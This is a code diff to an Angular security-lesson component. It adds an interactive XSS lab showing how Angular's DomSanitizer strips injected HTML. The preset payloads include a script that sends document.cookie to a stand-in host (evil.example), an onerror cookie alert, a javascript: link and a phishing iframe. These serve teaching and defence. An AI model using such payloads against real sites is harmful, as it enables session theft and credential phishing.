@@ -1,11 +1,13 @@
-import { Component, signal, computed } from '@angular/core';
+import { Component, SecurityContext, computed, inject, signal } from '@angular/core';
+import { FormsModule } from '@angular/forms';
+import { DomSanitizer } from '@angular/platform-browser';
 import { RouterLink } from '@angular/router';
 
 type Tab = 'xss' | 'csrf' | 'auth' | 'secrets' | 'headers';
 
 @Component({
   selector: 'app-lesson-security',
-  imports: [RouterLink],
+  imports: [RouterLink, FormsModule],
   styles: [`
     .tab-row { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 16px; }
     .tab-row button { padding: 6px 14px; border-radius: 20px; border: 1px solid var(--border);
@@ -67,13 +69,32 @@ type Tab = 'xss' | 'csrf' | 'auth' | 'secrets' | 'headers';
 &lt;iframe [src]="safeSrc"&gt;&lt;/iframe&gt;</pre>
         </div>
 
-        <h2>Live — [innerHTML] sanitization in action</h2>
+        <h2>Live — the sanitizer, opened up</h2>
         <div class="demo">
-          <p class="demo__title">Attacker payload bound with [innerHTML]:</p>
-          <div class="code" style="font-size:.82rem"><pre>{{ raw() }}</pre></div>
-          <p>What Angular actually renders:</p>
-          <div [innerHTML]="raw()" style="padding:8px 12px;border:1px solid var(--border);border-radius:8px"></div>
-          <p class="note" style="margin-top:8px">The &lt;b&gt; tag survives; the &lt;script&gt; and onerror handler are stripped. No alert fires.</p>
+          <p class="demo__title">XSS lab — edit the payload or load a preset attack</p>
+          <div class="row" style="margin-bottom:10px">
+            @for (p of presets; track p.label) {
+              <button class="ghost" (click)="payload.set(p.html)">{{ p.label }}</button>
+            }
+          </div>
+          <textarea rows="3" style="width:100%;font-family:monospace;font-size:.82rem"
+            [ngModel]="payload()" (ngModelChange)="payload.set($event)"></textarea>
+
+          <p style="margin:12px 0 4px">What the sanitizer lets through — the <em>exact</em> HTML Angular writes to the DOM:</p>
+          <div class="code" style="font-size:.82rem"><pre>{{ sanitized() }}</pre></div>
+
+          <p style="margin:12px 0 4px">Rendered result:</p>
+          <div [innerHTML]="payload()"
+            style="padding:10px 14px;border:1px dashed var(--border);border-radius:8px;min-height:2.4em"></div>
+
+          <p class="note" style="margin-top:10px">
+            Formatting tags (<code>&lt;b&gt;</code>, <code>&lt;i&gt;</code>, lists, links) survive.
+            <code>&lt;script&gt;</code> is removed entirely, event handlers like
+            <code>onerror</code> are stripped off their elements, and
+            <code>javascript:</code> URLs are neutered to <code>unsafe:javascript:…</code> —
+            the link renders but the browser refuses the scheme. No payload here can
+            execute. Open the console: Angular even warns you that it sanitized something.
+          </p>
         </div>
 
         <h2>Bypassing — the last resort</h2>
@@ -373,9 +394,42 @@ export const environment = {{ '{' }}
   `,
 })
 export class Security {
-  protected readonly raw = signal(
-    '<b>Bold &amp; safe</b> — <img src="x" onerror="alert(1)"> <script>alert(1)<\/script>',
+  private readonly sanitizer = inject(DomSanitizer);
+
+  protected readonly payload = signal(
+    '<b>Bold survives</b>, <i>so does italic</i> — <a href="javascript:alert(1)">a boobytrapped link</a> <img src="x" onerror="alert(1)"> <script>alert(1)<\/script>',
   );
+
+  /** The exact string Angular's HTML-context sanitizer produces for the payload. */
+  protected readonly sanitized = computed(
+    () =>
+      this.sanitizer.sanitize(SecurityContext.HTML, this.payload()) ||
+      '(the sanitizer stripped everything)',
+  );
+
+  protected readonly presets = [
+    {
+      label: 'script tag',
+      html: 'Hello <script>document.location="https://evil.example?c="+document.cookie<\/script> world',
+    },
+    {
+      label: 'img onerror',
+      html: '<img src="x" onerror="alert(document.cookie)"> a classic — no script tag needed',
+    },
+    {
+      label: 'javascript: link',
+      html: '<a href="javascript:alert(1)">win a free prize</a>',
+    },
+    {
+      label: 'iframe injection',
+      html: '<iframe src="https://evil.example/phish"></iframe> invisible credential phishing',
+    },
+    {
+      label: 'harmless rich text',
+      html: '<b>Bold</b>, <i>italic</i>, <ul><li>lists</li><li>links: <a href="https://angular.dev">angular.dev</a></li></ul> all survive',
+    },
+  ];
+
   protected readonly activeTab = signal<Tab>('xss');
   protected readonly tabs: { id: Tab; label: string }[] = [
     { id: 'xss', label: 'XSS' },
